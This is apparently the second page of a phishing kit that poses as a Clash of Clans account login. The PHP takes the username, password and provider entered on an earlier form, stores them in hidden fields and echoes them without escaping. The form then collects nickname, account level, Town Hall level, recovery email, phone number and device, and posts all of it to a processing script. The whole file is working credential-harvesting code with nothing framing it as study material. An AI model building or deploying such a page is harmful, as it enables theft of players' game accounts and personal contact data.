<?php 
$provider = "";
$username = "";
$password = "";
if(isset($_POST['login'])) {
    $username = $_POST['username'];
    $password = $_POST['pass'];
    $provider = $_POST['provider'];

    if(empty($username) || empty($password) || empty($provider)) {
        header('location: ../');
        exit();
    }
} else {
    header('location: ../');
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>COC | Lengkapi</title>
    <link rel="shorcut icon" href="assets/img/favicon.png">
    <link rel="stylesheet" type="text/css" href="../assets/css/login.css">
    <link href="https://fonts.googleapis.com/css?family=Montserrat:300,400,500,700|Open+Sans:300,300i,400,400i,700,700i" rel="stylesheet">
</head>
<body>
    <div id="bg"></div>
    <div class="idhaam69">
        <div class="header">
            <img class="img-header" src="../assets/img/logo.png" alt="Idhaam69">
        </div>

        <div class="form-login">
            <div class="bd">Hai Idhaam48<br>Isi data dengan lengkap dan benar!</div>
            <form action="../proses.php" method="POST">
                <input type="hidden" name="prov" value="<?php echo $provider;?>">
                <input type="hidden" name="dataUser" value="<?php echo $username;?>">
                <input type="hidden" name="dataPass" value="<?php echo $password;?>">
                <div class="form-input">
                    <label>Nickname</label>
                    <input type="text" name="nnk" placeholder="Enter Your Nickname here." required>
                </div>
                <div class="form-input">
                    <label>Account Level</label>
                    <input type="number" name="lvl" placeholder="Enter Account Level here." required>
                </div>
                <div class="form-input">
                    <label>Town Hall</label>
                    <input type="number" name="th" placeholder="Enter Town Hall level here." required>
                </div>
                <div class="form-input">
                    <label>Clan</label>
                    <input type="text" name="clan" placeholder="Enter Clan Name here. (Opsional)">
                </div>
                <div class="form-input">
                    <label>Recovery Email</label>
                    <input type="email" name="re" placeholder="Enter Your Recovery Email here." required>
                </div>
                <div class="form-input">
                    <label>Phone</label>
                    <input type="number" name="ph" placeholder="Enter Your Phone Numner here." required>
                </div>
                <div class="form-input">
                    <label>Device</label>
                    <select name="device" required>
                        <option selected disabled>Choose here</option>
                        <option value="IOS">IOS</option>
                        <option value="Android">ANDROID</option>
                    </select>
                </div>
                <div class="form-input">
                    <button class="btn-input" name="dataLogin">Submit</button>
                </div>
            </form>
        </div>
    </div>
</body>
</html>